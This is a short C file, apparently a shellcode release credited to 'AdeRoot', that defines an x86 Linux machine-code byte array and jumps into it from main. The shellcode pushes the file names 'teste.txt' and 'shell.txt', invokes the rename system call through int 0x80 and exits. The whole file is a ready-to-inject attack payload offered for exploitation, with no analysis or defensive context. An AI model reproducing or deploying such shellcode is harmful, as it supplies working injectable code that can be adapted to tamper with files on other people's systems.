/*
ShellCode Rename File x86
Author: AdeRoot
Date: 03/10/2015
Greetz: Bruce_Dickinson
*/
 
#include <stdio.h>
 
unsigned const char shellcode[] =
 
"\x31\xc0\xb0\x26"
"\x6a\x74\x68\x65"
"\x2e\x74\x78\x68"
"\x74\x65\x73\x74"
"\x89\xe3\x6a\x74"
"\x68\x6c\x2e\x74"
"\x78\x68\x73\x68"
"\x65\x6c\x89\xe1"
"\xcd\x80\x31\xc0"
"\xb0\x01\x8b\x1d"
"\xa2\x90\x04\x08"
"\xcd\x80";
 
int main(void) {
   __asm__("jmp shellcode");
}
